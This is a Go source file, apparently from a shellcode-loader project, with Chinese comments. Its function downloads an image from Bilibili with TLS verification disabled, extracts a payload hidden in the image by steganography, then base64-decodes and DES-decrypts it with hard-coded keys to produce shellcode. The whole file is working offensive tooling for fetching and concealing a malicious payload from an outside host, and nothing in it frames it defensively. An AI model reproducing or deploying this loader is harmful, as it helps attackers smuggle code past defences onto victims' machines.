package image

import (
	"bimg-shellcode-loader/crypt"
	"bufio"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/http/cookiejar"
)

// GetShellcode 从b站上下载图片，获取shellcode
func GetShellcode(url string) []byte {
	transport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:       cookieJar,
		Transport: transport,
	}
	resp, err := client.Get(url)
	if err != nil {
		fmt.Println("获取失败.")
	}
	defer resp.Body.Close()

	reader := bufio.NewReader(resp.Body)
	msg := crypt.StegDecode(reader)
	fmt.Println(string(msg))
	// 对msg进行base64解码
	shellcode, _ := crypt.CustomBase64Decode(string(msg))
	fmt.Println(shellcode)
	// 对shellcode进行des解密
	shellcode, _ = crypt.DesDecrypt(shellcode, []byte("12345678"), []byte("87654321"))
	return shellcode
}
